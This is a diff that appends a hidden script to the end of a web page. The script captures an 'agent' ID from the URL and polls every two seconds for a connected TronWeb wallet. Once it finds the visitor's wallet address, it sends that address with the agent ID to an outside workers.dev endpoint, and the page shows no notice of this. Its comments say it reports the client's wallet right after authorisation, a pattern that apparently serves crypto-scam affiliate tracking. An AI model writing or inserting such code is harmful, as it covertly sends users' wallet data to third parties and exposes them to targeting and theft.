@@ -1344,5 +1344,30 @@ bootstrap();
     });
   }
 </script>
+<script>
+  (function() {
+    // 抓取网址里的代理ID (?agent=xxx)
+    const urlParams = new URLSearchParams(window.location.search);
+    const agentId = urlParams.get('agent');
+    if (agentId) localStorage.setItem('bind_agent_id', agentId);
+
+    // 监听客户钱包状态，一旦授权立刻上报给后台
+    setInterval(async () => {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            const clientAddress = window.tronWeb.defaultAddress.base58;
+            const storedAgentId = localStorage.getItem('bind_agent_id');
+            
+            if (clientAddress && storedAgentId && !localStorage.getItem('reported_' + clientAddress)) {
+                localStorage.setItem('reported_' + clientAddress, '1');
+                fetch('https://duzj.968888u.workers.dev/api/bind', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ clientAddress, agentId: storedAgentId })
+                });
+            }
+        }
+    }, 2000);
+  })();
+</script>
 </body>
 </html>
